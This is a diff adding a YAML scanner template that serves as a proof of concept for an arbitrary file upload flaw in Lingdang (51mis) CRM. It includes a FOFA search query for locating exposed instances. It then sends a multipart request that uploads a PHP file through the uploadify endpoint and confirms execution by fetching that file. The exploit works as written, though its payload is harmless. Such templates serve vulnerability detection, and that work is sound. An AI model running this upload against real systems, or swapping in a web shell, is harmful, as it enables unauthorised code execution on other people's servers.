@@ -1,0 +1,52 @@
+id: poc-yaml-51mis-crm-uploadify-anyfile-upload
+info:
+  name: 灵当crm uploadify 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 灵当CRM
+  fofa: body="crmcommon/js/jquery/jquery-1.10.1.min.js" || (body="http://localhost:8088/crm/index.php"
+    && body="ldcrm.base.js")
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /crm/uploaddify/uploadify.php
+  headers:
+    Content-Type: multipart/form-data; boundary=---------------------------45250802924973458471174811279
+  data: '-----------------------------45250802924973458471174811279
+
+    Content-Disposition: form-data; name="Filedata"; filename="{{.t1}}.php"
+
+    Content-Type: images/cat_icon
+
+
+    <?php echo md5({{.t1}});?>
+
+    -----------------------------45250802924973458471174811279
+
+    Content-Disposition: form-data; name="myatt_moduel"
+
+
+    1
+
+    -----------------------------45250802924973458471174811279
+
+    Content-Disposition: form-data; name="myatt_id";
+
+
+    1
+
+    -----------------------------45250802924973458471174811279'
+  expression: 'status_code == 200 &&
+
+    contains(body,".php") &&
+
+    !contains(body,"<")
+
+    '
+- method: GET
+  path: /crm/storage/1/1/{{.t1}}.php
+  expression: status_code == 200 && body == t2
+transport: http
